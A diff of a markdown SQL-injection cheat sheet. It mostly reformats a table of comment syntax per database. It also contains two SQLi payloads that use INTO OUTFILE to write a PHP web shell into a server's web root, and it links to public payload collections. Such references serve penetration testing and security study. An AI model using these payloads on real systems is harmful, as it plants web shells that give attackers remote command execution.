@@ -52,22 +52,22 @@ There are many places where SQLi can be performed. For example,
 
 Comment syntax is depending on the database used in the website.
 
-|DBMS|Comments|
-|---|---|
-|MySQL|`-- -` (add a space after `--`)|
-||`#`|
-||`/*comment*/`|
-||`/*!comment*/`|
-|MSSQL|`--`|
-||`/*comment*/`|
-|Oracle|`--`|
-|PostgreSQL|`--`|
-||`/*comment*/`|
-|SQLite|`--`|
-||`/*comment*/`|
+| DBMS       | Comments                        |
+| ---------- | ------------------------------- |
+| MySQL      | `-- -` (add a space after `--`) |
+|            | `#`                             |
+|            | `/*comment*/`                   |
+|            | `/*!comment*/`                  |
+| MSSQL      | `--`                            |
+|            | `/*comment*/`                   |
+| Oracle     | `--`                            |
+| PostgreSQL | `--`                            |
+|            | `/*comment*/`                   |
+| SQLite     | `--`                            |
+|            | `/*comment*/`                   |
 
 ```bash
-SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' 
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
 
 ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
 ```
@@ -158,3 +158,4 @@ example-command -flag target
 https://exploit-notes.hdks.org/exploit/web/sql-injection-cheat-sheet/
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection
+
